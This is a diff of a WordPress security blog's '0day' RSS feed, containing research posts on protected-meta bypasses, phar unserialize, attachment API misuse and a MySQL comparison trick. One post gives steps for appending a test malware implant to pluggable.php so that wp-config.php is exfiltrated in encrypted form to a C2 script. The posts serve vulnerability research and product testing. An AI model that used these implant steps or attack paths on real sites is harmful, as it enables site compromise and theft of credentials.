@@ -11,27 +11,27 @@
 	<title>0day &#8211; WP deeply</title>
 	<atom:link href="https://wpdeeply.com/tag/0day/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
-	<description></description>
-	<lastBuildDate>Mon, 24 Aug 2020 03:41:26 +0000</lastBuildDate>
+	<description>// Silence is golden.  Not for you!</description>
+	<lastBuildDate>Sun, 11 Oct 2020 21:34:09 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
 	<sy:updateFrequency>
 	1	</sy:updateFrequency>
-	<generator>https://wordpress.org/?v=5.4.2</generator>
+	<generator>https://wordpress.org/?v=5.5.1</generator>
 	<item>
 		<title>WordPress security testing</title>
 		<link>https://wpdeeply.com/wordpress-security-testing/</link>
 		
 		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Mon, 24 Aug 2020 03:09:33 +0000</pubDate>
-				<category><![CDATA[redteam]]></category>
+		<pubDate>Mon, 24 Aug 2020 19:12:39 +0000</pubDate>
+				<category><![CDATA[red team]]></category>
 		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=209</guid>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=5</guid>
 
-					<description><![CDATA[There are a lot of security solutions around WP eco system advertising their possibility to fight malware, intrusions and exploitation. Most of them are endpoint security solutions, there are cloud ones, but also market knows the managed WP services that offer security in their own way. Having big choice sometime is a problem, because you [&#8230;]]]></description>
+					<description><![CDATA[There are a lot of security solutions around WP eco system advertising their possibility to fight malware, intrusions and exploitation. Most of them are endpoint security solutions, there are cloud ones, but also market knows the managed WP services that offer security in their own way. Having big choice sometime is a problem, because you &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-security-testing/"> <span class="screen-reader-text">WordPress security testing</span> Read More &#187;</a></p>]]></description>
 										<content:encoded><![CDATA[
-<p>There are a lot of security solutions around WP eco system advertising their possibility to fight malware, intrusions and exploitation. Most of them are endpoint security solutions, there are cloud ones, but also market knows the managed WP services that offer security in their own way. Having big choice sometime is a problem, because you can&#8217;t verify all of the claims and if you try, you will need to waste huge load of time auditing / testing. That is why the goal of this section is to provide tools and methods for easy verification of those claims and to help users into choosing the right offering. </p>
+<p>There are a lot of security solutions around WP eco system advertising their possibility to fight malware, intrusions and exploitation. Most of them are endpoint security solutions, there are cloud ones, but also market knows the managed WP services that offer security in their own way. Having big choice sometime is a problem, because you can’t verify all of the claims and if you try, you will need to waste huge load of time auditing / testing. That is why the goal of this section is to provide tools and methods for easy verification of those claims and to help users into choosing the right offering.</p>
 
 
 
@@ -39,7 +39,7 @@
 
 
 
-<p>For the purpose of testing two scripts are created: malware/implant and remote C2 server script. Both are extremely easy for setup, but default versions are prepared in that way, so their abuse would require modifications. </p>
+<p>For the purpose of testing two scripts are created: malware/implant and remote C2 server script. Both are extremely easy for setup, but default versions are prepared in that way, so their abuse would require modifications.</p>
 
 
 
@@ -47,7 +47,7 @@
 
 
 
-<p>This software is based on <a rel="noreferrer noopener" href="https://github.com/Slavco/wp-weaver" target="_blank">wp-weaver</a> project, includes encryption in order to hide its actions and is more than modular to accept and execute everything that is sent by C2. </p>
+<p>This software is based on <a rel="noreferrer noopener" href="https://github.com/Slavco/wp-weaver" target="_blank">wp-weaver</a> project, includes encryption in order to hide its actions and is more than modular to accept and execute everything that is sent by C2.</p>
 
 
 
@@ -215,7 +215,7 @@ exit();</code></pre>
 
 
 
-<ul><li>You will need to be logged in as user with upload permissions on the WP (it is this way in order to be stopped abuse of the scripts and that is why in the payload is used <span class="has-inline-color has-primary-color"><strong>wp_upload_bits</strong></span> function)</li><li>In the malware script set up your own value for <span class="has-inline-color has-primary-color"><strong>C2_URL</strong></span> constant and that is the url of your C2 script</li><li>In order to work C2 script you will need <strong>sodium_compat</strong> next to it and it could be found into any WP 5+ distribution under wp-includes folder</li><li>cat malware.txt >> /path_to_your_code/wp-includes/pluggable.php</li><li>Logged in with user with upload permissions hit refresh on your WP homepage with <strong>?wpdeeply=ok</strong> parameters and check in the upload directory <strong>wpdeeply?-x.jpg</strong> with encrypted <strong>wp-config.php</strong> content </li></ul>
+<ul><li>You will need to be logged in as user with upload permissions on the WP (it is this way in order to be stopped abuse of the scripts and that is why in the payload is used <strong>wp_upload_bits</strong> function)</li><li>In the malware script set up your own value for <strong>C2_URL</strong> constant and that is the url of your C2 script</li><li>In order to work C2 script you will need <strong>sodium_compat</strong> next to it and it could be found into any WP 5+ distribution under wp-includes folder</li><li>cat malware.txt &gt;&gt; /path_to_your_code/wp-includes/pluggable.php</li><li>Logged in with user with upload permissions hit refresh on your WP homepage with <strong>?wpdeeply=ok</strong> parameters and check in the upload directory <strong>wpdeeply?-x.jpg</strong> with encrypted <strong>wp-config.php</strong> content</li></ul>
 
 
 
@@ -223,15 +223,11 @@ exit();</code></pre>
 
 
 
-<p>This means that you managed to put malware on your WP and to execute code in it. For tech people it is clear (try to use peer method of the weaver) what is done in the background, but for not tech savvy users won&#8217;t be, but both are more than free to question its security guarantee about the events. Questions that would be good to be answered:</p>
+<p>This means that you managed to put malware on your WP and to execute code in it. For tech people it is clear (try to use peer method of the weaver) what is done in the background, but for not tech savvy users won’t be, but both are more than free to question its security guarantee about the events. Questions that would be good to be answered:</p>
 
 
 
-<ul><li>Why malware doesn&#8217;t disappear after update / re-install from admin screen or wpcli?</li><li>What type of commands &#8220;attacker&#8221; executed against WP?</li><li>What data was leaked and where?   </li><li>&#8230; </li></ul>
-
-
-
-<p></p>
+<ul><li>Why malware doesn’t disappear after update / re-install from admin screen or wpcli?</li><li>What type of commands “attacker” executed against WP?</li><li>What data was leaked and where?</li><li>…</li></ul>
 ]]></content:encoded>
 					
 		
@@ -242,19 +238,18 @@ exit();</code></pre>
 		<link>https://wpdeeply.com/wordpress-protected-meta-via-wp-job-manager/</link>
 		
 		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Tue, 11 Aug 2020 10:52:13 +0000</pubDate>
-				<category><![CDATA[core]]></category>
-		<category><![CDATA[plugins]]></category>
+		<pubDate>Tue, 11 Aug 2020 20:03:13 +0000</pubDate>
+				<category><![CDATA[plugins]]></category>
 		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=199</guid>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=25</guid>
 
-					<description><![CDATA[Adding slashes or removing them is a thing on WP. Most of the meta functions perform that e.g. they hold that not popular&#160;wp_unslashagainst meta keys and values. This means when input towards&#160;update_metadata&#160;and&#160;add_metadata&#160;isn&#8217;t from the current http requst via some web form e.g. html interface there is possibility for user to insert/update protected meta key into [&#8230;]]]></description>
+					<description><![CDATA[Adding slashes or removing them is a thing on WP. Most of the meta functions perform that e.g. they hold that not popular&#160;wp_unslashagainst meta keys and values. This means when input towards&#160;update_metadata&#160;and&#160;add_metadata&#160;isn’t from the current http requst via some web form e.g. html interface there is possibility for user to insert/update protected meta key into &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-protected-meta-via-wp-job-manager/"> <span class="screen-reader-text">WordPress protected meta via wp job manager</span> Read More &#187;</a></p>]]></description>
 										<content:encoded><![CDATA[
-<p>Adding slashes or removing them is a thing on WP. Most of the meta functions perform that e.g. they hold that not popular&nbsp;<code>wp_unslash</code>against meta keys and values. This means when input towards&nbsp;<code>update_metadata</code>&nbsp;and&nbsp;<code>add_metadata</code>&nbsp;isn&#8217;t from the current http requst via some web form e.g. html interface there is possibility for user to insert/update protected meta key into post meta database table with simple&nbsp;<code>\_any-value</code>&nbsp;meta key format.</p>
+<p>Adding slashes or removing them is a thing on WP. Most of the meta functions perform that e.g. they hold that not popular&nbsp;<code>wp_unslash</code>against meta keys and values. This means when input towards&nbsp;<code>update_metadata</code>&nbsp;and&nbsp;<code>add_metadata</code>&nbsp;isn’t from the current http requst via some web form e.g. html interface there is possibility for user to insert/update protected meta key into post meta database table with simple&nbsp;<code>\_any-value</code>&nbsp;meta key format.</p>
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-protected-meta-job-manager.md#eli5-poc"></a>Eli5 PoC</h2>
+<h2>Eli5 PoC</h2>
 
 
 
@@ -320,23 +315,23 @@ case 'duplicate':
 
 
 
-<p>From here we see that&nbsp;<code>_wpnonce</code>&nbsp;isn&#8217;t tight up with job id, but also from&nbsp;<code>job_manager_user_can_edit_job</code>&nbsp;we see that post type isn&#8217;t checked, but only capability for user to edit the post and that could be any post from any post type. Having in mind previous knowledge presented on wpdeeply and nature of WordPress, this could be considered as high severity issue. Check the facts for RCE <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p>From here we see that&nbsp;<code>_wpnonce</code>&nbsp;isn’t tight up with job id, but also from&nbsp;<code>job_manager_user_can_edit_job</code>&nbsp;we see that post type isn’t checked, but only capability for user to edit the post and that could be any post from any post type. Having in mind previous knowledge presented on wpdeeply and nature of WordPress, this could be considered as high severity issue. Check the facts for RCE <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-protected-meta-job-manager.md#few-facts"></a>Few facts</h2>
+<h2>Few facts</h2>
 
 
 
-<ul><li>WP Job Manager <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/" target="_blank">isn&#8217;t alone</a> and can be attacked via core</li><li>What about WooCommerce before 4.1.0 or <a href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank" rel="noreferrer noopener">latest WooCommerce</a></li><li>Accessing the blocked meta keys in <code>job_manager_duplicate_listing</code> via this <a href="https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/" target="_blank" rel="noreferrer noopener">technique</a></li></ul>
+<ul><li>WP Job Manager <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/" target="_blank">isn’t alone</a> and can be attacked via core</li><li>What about WooCommerce before 4.1.0 or <a href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank" rel="noreferrer noopener">latest WooCommerce</a></li><li>Accessing the blocked meta keys in&nbsp;<code>job_manager_duplicate_listing</code>&nbsp;via this <a href="https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/" target="_blank" rel="noreferrer noopener">technique</a></li></ul>
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-protected-meta-job-manager.md#remediation"></a>Remediation</h2>
+<h2>Remediation</h2>
 
 
 
-<ul><li>Calling <code>wp_slash</code> on input won&#8217;t solve the issue, because <code>update_metadata</code></li><li>:/</li></ul>
+<ul><li>Calling&nbsp;<code>wp_slash</code>&nbsp;on input won’t solve the issue, because <code>update_metadata</code></li><li>:/</li></ul>
 ]]></content:encoded>
 					
 		
@@ -347,23 +342,23 @@ case 'duplicate':
 		<link>https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/</link>
 		
 		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Sun, 09 Aug 2020 14:39:59 +0000</pubDate>
+		<pubDate>Sun, 09 Aug 2020 20:09:17 +0000</pubDate>
 				<category><![CDATA[core]]></category>
 		<category><![CDATA[plugins]]></category>
 		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=197</guid>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=27</guid>
 
-					<description><![CDATA[Core had put some efforts in order to prevent accessing&#160;attachment&#160;post type functions from another post types. Usually checks are done by calling&#160;get_post&#160;and comparing the post type with&#160;attachment, but that is selective and only in hand picked places. It is that way because performances mainly, so many functions are lacking this checks. Eli5 PoC One of [&#8230;]]]></description>
+					<description><![CDATA[Core had put some efforts in order to prevent accessing&#160;attachment&#160;post type functions from another post types. Usually checks are done by calling&#160;get_post&#160;and comparing the post type with&#160;attachment, but that is selective and only in hand picked places. It is that way because performances mainly, so many functions are lacking this checks. Eli5 PoC One of &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/"> <span class="screen-reader-text">WordPress attachment api functions and any post type</span> Read More &#187;</a></p>]]></description>
 										<content:encoded><![CDATA[
 <p>Core had put some efforts in order to prevent accessing&nbsp;<code>attachment</code>&nbsp;post type functions from another post types. Usually checks are done by calling&nbsp;<code>get_post</code>&nbsp;and comparing the post type with&nbsp;<code>attachment</code>, but that is selective and only in hand picked places. It is that way because performances mainly, so many functions are lacking this checks.</p>
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-attachment-api-any.md#eli5-poc"></a>Eli5 PoC</h2>
+<h2>Eli5 PoC</h2>
 
 
 
-<p>One of them, that calls another attachment related is <code>wp_update_image_subsizes</code> and there we have the following calls up to <code>path_join</code>where we have <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-and-phar-unserialize/" target="_blank">phar unserialize</a> or <code>wp_create_image_subsizes</code> where <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank">image editor RCE ?!</a> is in game, but also <code>getimagesize</code> as phar unserialize appears too.</p>
+<p>One of them, that calls another attachment related is&nbsp;<code>wp_update_image_subsizes</code>&nbsp;and there we have the following calls up to&nbsp;<code>path_join</code>where we have <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-and-phar-unserialize/" target="_blank">phar unserialize</a> or&nbsp;<code>wp_create_image_subsizes</code>&nbsp;where <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank">image editor RCE ?!</a> is in game, but also&nbsp;<code>getimagesize</code>&nbsp;as phar unserialize appears too.</p>
 
 
 
@@ -415,7 +410,7 @@ case 'duplicate':
 
 
 
-<p>where&nbsp;<code>attachment_id</code>&nbsp;could be any post&nbsp;<code>ID</code>&nbsp;from any&nbsp;<code>post_type</code>. So if&nbsp;<code>author</code>&nbsp;user role grabs the&nbsp;<code>_wpnonce</code>&nbsp;from&nbsp;<code>wp-admin/media-new.php</code>&nbsp;could perform the request below with &#8220;attacking&#8221; post ID.</p>
+<p>where&nbsp;<code>attachment_id</code>&nbsp;could be any post&nbsp;<code>ID</code>&nbsp;from any&nbsp;<code>post_type</code>. So if&nbsp;<code>author</code>&nbsp;user role grabs the&nbsp;<code>_wpnonce</code>&nbsp;from&nbsp;<code>wp-admin/media-new.php</code>&nbsp;could perform the request below with “attacking” post ID.</p>
 
 
 
@@ -424,23 +419,23 @@ case 'duplicate':
 
 
 
-<p>How to add protected meta into posts?! Check the facts below. <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p>How to add protected meta into posts?! Check the facts below. <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-attachment-api-any.md#few-facts"></a>Few facts</h2>
+<h2>Few facts</h2>
 
 
 
-<ul><li>Yoast Duplicate posts is <a href="https://plugins.trac.wordpress.org/browser/duplicate-post/trunk/duplicate-post-admin.php#L637" target="_blank" rel="noreferrer noopener">adding protected</a> meta when cloning if meta / custom field key starts with <code>\_</code></li><li>We had already seen the <a href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank" rel="noreferrer noopener">wordpress-importer in action</a></li><li>WooCommerce had fixed something similar <a rel="noreferrer noopener" href="https://raw.githubusercontent.com/woocommerce/woocommerce/master/CHANGELOG.txt" target="_blank">few months</a> ago in 4.1.0 version</li></ul>
+<ul><li>Yoast Duplicate posts is <a href="https://plugins.trac.wordpress.org/browser/duplicate-post/trunk/duplicate-post-admin.php#L637" target="_blank" rel="noreferrer noopener">adding protected</a> meta when cloning if meta / custom field key starts with&nbsp;<code>\_</code></li><li>We had already seen the <a href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank" rel="noreferrer noopener">wordpress-importer in action</a></li><li>WooCommerce had fixed something similar <a rel="noreferrer noopener" href="https://raw.githubusercontent.com/woocommerce/woocommerce/master/CHANGELOG.txt" target="_blank">few months</a> ago in 4.1.0 version</li></ul>
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-attachment-api-any.md#remediation"></a>Remediation</h2>
+<h2>Remediation</h2>
 
 
 
-<ul><li>make sure that <code>attachment</code> routines are performed only over attachments</li><li>do not allow users to create protected meta</li></ul>
+<ul><li>make sure that&nbsp;<code>attachment</code>&nbsp;routines are performed only over attachments</li><li>do not allow users to create protected meta</li></ul>
 ]]></content:encoded>
 					
 		
@@ -451,12 +446,12 @@ case 'duplicate':
 		<link>https://wpdeeply.com/wordpress-and-phar-unserialize/</link>
 		
 		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Fri, 07 Aug 2020 21:58:43 +0000</pubDate>
+		<pubDate>Fri, 07 Aug 2020 20:41:00 +0000</pubDate>
 				<category><![CDATA[core]]></category>
 		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=188</guid>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=43</guid>
 
-					<description><![CDATA[Core team had put some effort into project in order to preven unserialize of user input via&#160;phar&#160;stream wrapper. In general, efforts are good, but to excelent there are two more grades and this is the max with this approach. In the core there is function&#160;path_join&#160;that accepts two parameters&#160;$base&#160;and&#160;$path.&#160;$path&#160;is then sent towards function&#160;path_is_absolute&#160;and from the code [&#8230;]]]></description>
+					<description><![CDATA[Core team had put some effort into project in order to preven unserialize of user input via&#160;phar&#160;stream wrapper. In general, efforts are good, but to excelent there are two more grades and this is the max with this approach. In the core there is function&#160;path_join&#160;that accepts two parameters&#160;$base&#160;and&#160;$path.&#160;$path&#160;is then sent towards function&#160;path_is_absolute&#160;and from the code &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-and-phar-unserialize/"> <span class="screen-reader-text">WordPress and phar unserialize</span> Read More &#187;</a></p>]]></description>
 										<content:encoded><![CDATA[
 <p>Core team had put some effort into project in order to preven unserialize of user input via&nbsp;<code>phar</code>&nbsp;stream wrapper. In general, efforts are good, but to excelent there are two more grades and this is the max with this approach. In the core there is function&nbsp;<code>path_join</code>&nbsp;that accepts two parameters&nbsp;<code>$base</code>&nbsp;and&nbsp;<code>$path</code>.&nbsp;<code>$path</code>&nbsp;is then sent towards function&nbsp;<code>path_is_absolute</code>&nbsp;and from the code</p>
 
@@ -479,7 +474,7 @@ case 'duplicate':
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-phar-unserialize.md#eli5-poc"></a>Eli5 PoC</h2>
+<h2>Eli5 PoC</h2>
 
 
 
@@ -500,23 +495,23 @@ if ( isset( $backup_sizes['full-orig'] ) &amp;&amp; is_array( $backup_sizes['ful
 
 
 
-<p>There it is, unserialize of user input. How to place custom values in&nbsp;<code>_wp_attachment_backup_sizes</code>, check the facts <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p>There it is, unserialize of user input. How to place custom values in&nbsp;<code>_wp_attachment_backup_sizes</code>, check the facts <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-phar-unserialize.md#few-facts"></a>Few facts</h2>
+<h2>Few facts</h2>
 
 
 
-<ul><li><code>import</code> capability is <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank">fatal</a> for WP because arbitrary post create from low permission user roles</li><li>this is how to meddle with <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-attached-file-meta/" target="_blank">attached file</a> via <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-importer-and-attached-file/" target="_blank">importer</a></li><li><code>path_join</code> is wide spread across <a rel="noreferrer noopener" href="https://wpdirectory.net/search/01EF5E56NN5S9VHK7BMQ9XF3BZ" target="_blank">eco system</a></li><li>no need for <a href="https://wpdeeply.com/wordpress-upload-any-file-with-image-extension/" target="_blank" rel="noreferrer noopener">image polyglots</a> </li></ul>
+<ul><li><code>import</code>&nbsp;capability is <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank">fatal</a> for WP because arbitrary post create from low permission user roles</li><li>this is how to meddle with <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-attached-file-meta/" target="_blank">attached file</a> via <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-importer-and-attached-file/" target="_blank">importer</a></li><li><code>path_join</code>&nbsp;is wide spread across <a rel="noreferrer noopener" href="https://wpdirectory.net/search/01EF5E56NN5S9VHK7BMQ9XF3BZ" target="_blank">eco system</a></li><li>no need for <a href="https://wpdeeply.com/wordpress-upload-any-file-with-image-extension/" target="_blank" rel="noreferrer noopener">image polyglots</a></li></ul>
 
 
 
-<h1><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-phar-unserialize.md#remediation"></a>Remediation</h1>
+<h1>Remediation</h1>
 
 
 
-<ul><li>phar vulnerabilities should be handled on <a href="https://github.com/TYPO3/phar-stream-wrapper" target="_blank" rel="noreferrer noopener">stream wrapper level</a>, not with &#8220;guarding&#8221;</li></ul>
+<ul><li>phar vulnerabilities should be handled on <a href="https://github.com/TYPO3/phar-stream-wrapper" target="_blank" rel="noreferrer noopener">stream wrapper level</a>, not with “guarding”</li></ul>
 ]]></content:encoded>
 					
 		
@@ -527,12 +522,12 @@ if ( isset( $backup_sizes['full-orig'] ) &amp;&amp; is_array( $backup_sizes['ful
 		<link>https://wpdeeply.com/wordpress-and-multiple-maybe_unserialize/</link>
 		
 		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Mon, 27 Jul 2020 21:12:58 +0000</pubDate>
+		<pubDate>Mon, 27 Jul 2020 20:12:00 +0000</pubDate>
 				<category><![CDATA[plugins]]></category>
 		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=185</guid>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=29</guid>
 
-					<description><![CDATA[WordPress introduced&#160;maybe_unserialize&#160;and&#160;maybe_serialize&#160;as security functions in the past and they are deeply integrated in the core. Usually for backward compatibility or improper usage in the past, many software vendors are using multiple&#160;maybe_unserialize towards values that could be planted into DB with lower number of&#160;maybe_serializecalls. Eli5 PoC and if you think that this code isn&#8217;t existing then [&#8230;]]]></description>
+					<description><![CDATA[WordPress introduced&#160;maybe_unserialize&#160;and&#160;maybe_serialize&#160;as security functions in the past and they are deeply integrated in the core. Usually for backward compatibility or improper usage in the past, many software vendors are using multiple&#160;maybe_unserialize towards values that could be planted into DB with lower number of&#160;maybe_serializecalls. Eli5 PoC and if you think that this code isn’t existing then &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-and-multiple-maybe_unserialize/"> <span class="screen-reader-text">WordPress and multiple maybe_unserialize</span> Read More &#187;</a></p>]]></description>
 										<content:encoded><![CDATA[
 <p>WordPress introduced&nbsp;<code>maybe_unserialize</code>&nbsp;and&nbsp;<code>maybe_serialize</code>&nbsp;as security functions in the past and they are deeply integrated in the core. Usually for backward compatibility or improper usage in the past, many software vendors are using multiple&nbsp;<code>maybe_unserialize</code> towards values that could be planted into DB with lower number of&nbsp;<code>maybe_serialize</code>calls.</p>
 
@@ -554,19 +549,19 @@ $values = array_map(
 
 
 
-<p>and if you think that this code isn&#8217;t existing then <a rel="noreferrer noopener" href="https://plugins.trac.wordpress.org/browser/woocommerce-multilingual/trunk/inc/translation-editor/class-wcml-editor-ui-product-job.php#L984" target="_blank">check this</a> out. Yes it is 100k active installs Woo plugin and when Woo unserialze attack is in question, <a rel="noreferrer noopener" href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank">then</a>! :/</p>
+<p>and if you think that this code isn’t existing then <a rel="noreferrer noopener" href="https://plugins.trac.wordpress.org/browser/woocommerce-multilingual/trunk/inc/translation-editor/class-wcml-editor-ui-product-job.php#L984" target="_blank">check this</a> out. Yes it is 100k active installs Woo plugin and when Woo unserialze attack is in question, <a rel="noreferrer noopener" href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank">then</a>! :/</p>
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-multiple-maybe-unserialize.md#few-facts"></a>Few facts</h2>
+<h2>Few facts</h2>
 
 
 
-<ul><li>double <code>maybe_unserialize</code> is quite widespread around WP eco system, specially in Woo related plugins</li></ul>
+<ul><li>double&nbsp;<code>maybe_unserialize</code>&nbsp;is quite widespread around WP eco system, specially in Woo related plugins</li></ul>
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-multiple-maybe-unserialize.md#remadiation"></a>Remediation</h2>
+<h2>Remediation</h2>
 
 
 
@@ -581,19 +576,19 @@ $values = array_map(
 		<link>https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/</link>
 		
 		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Sat, 25 Jul 2020 22:09:53 +0000</pubDate>
+		<pubDate>Sat, 25 Jul 2020 20:16:00 +0000</pubDate>
 				<category><![CDATA[core]]></category>
 		<category><![CDATA[plugins]]></category>
 		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=178</guid>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=31</guid>
 
-					<description><![CDATA[If we execute the following MySQL query against WP database we will get results in case we had already uploaded media in the past This is sort of &#8220;feature&#8221; of MySQL RDBMS, but what this means from WP aspect. It means a lot, because in the past there were account take over / backdoor vulnerabilities [&#8230;]]]></description>
+					<description><![CDATA[If we execute the following MySQL query against WP database we will get results in case we had already uploaded media in the past This is sort of “feature” of MySQL RDBMS, but what this means from WP aspect. It means a lot, because in the past there were account take over / backdoor vulnerabilities &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/"> <span class="screen-reader-text">WordPress core and MySQL string comparison</span> Read More &#187;</a></p>]]></description>
 										<content:encoded><![CDATA[
 <p>If we execute the following MySQL query against WP database</p>
 
 
 
-<pre class="wp-block-code"><code lang="sql" class="language-sql">select * from wp_postmeta where meta_key = concat(char(1),"_wp_attached_file");
+<pre class="wp-block-code"><code lang="php" class="language-php">select * from wp_postmeta where meta_key = concat(char(1),"_wp_attached_file");
 </code></pre>
 
 
@@ -602,7 +597,7 @@ $values = array_map(
 
 
 
-<pre class="wp-block-code"><code class="">+---------+---------+-------------------+--------------------------------+
+<pre class="wp-block-code"><code lang="bash" class="language-bash">+---------+---------+-------------------+--------------------------------+
 | meta_id | post_id | meta_key          | meta_value                     |
 +---------+---------+-------------------+--------------------------------+
 |      46 |      92 | _wp_attached_file | 2020/07/wpdeeply.png#/boom.png |
@@ -614,7 +609,7 @@ $values = array_map(
 
 
 
-<p>This is sort of &#8220;feature&#8221; of MySQL RDBMS, but what this means from WP aspect. It means a lot, because in the past there were account take over / backdoor vulnerabilities fixed silently and today we are going to focus on&nbsp;<code>update_metadata</code>&nbsp;function. WordPress prevents medling with protected meta via&nbsp;<code>is_protected_meta</code>&nbsp;function which basically checks if&nbsp;<code>meta_key</code>&nbsp;starts with&nbsp;<code>_</code>, but that isn&#8217;t enough because it is on PHP side.</p>
+<p>This is sort of “feature” of MySQL RDBMS, but what this means from WP aspect. It means a lot, because in the past there were account take over / backdoor vulnerabilities fixed silently and today we are going to focus on&nbsp;<code>update_metadata</code>&nbsp;function. WordPress prevents medling with protected meta via&nbsp;<code>is_protected_meta</code>&nbsp;function which basically checks if&nbsp;<code>meta_key</code>&nbsp;starts with&nbsp;<code>_</code>, but that isn’t enough because it is on PHP side.</p>
 
 
 
@@ -644,19 +639,19 @@ add_action(init, "bypass_protected_meta");
 
 
 
-<p>Refresh the media (will not be displayed) and if you check in DB&nbsp;<code>_wp_attached_file</code>&nbsp;will have the&nbsp;<code>wpdeeply</code>&nbsp;value. Is this bug with impact? Well Jetpack folks will need to answer that&nbsp;<a href="https://github.com/Automattic/jetpack/blob/master/json-endpoints/class.wpcom-json-api-update-post-v1-2-endpoint.php#L824">https://github.com/Automattic/jetpack/blob/master/json-endpoints/class.wpcom-json-api-update-post-v1-2-endpoint.php#L824</a>, but you can find a lot of use cases on wpdirectory <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p>Refresh the media (will not be displayed) and if you check in DB&nbsp;<code>_wp_attached_file</code>&nbsp;will have the&nbsp;<code>wpdeeply</code>&nbsp;value. Is this bug with impact? Well Jetpack folks will need to answer that&nbsp;<a href="https://github.com/Automattic/jetpack/blob/master/json-endpoints/class.wpcom-json-api-update-post-v1-2-endpoint.php#L824">https://github.com/Automattic/jetpack/blob/master/json-endpoints/class.wpcom-json-api-update-post-v1-2-endpoint.php#L824</a>, but you can find a lot of use cases on wpdirectory <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
 
 
 
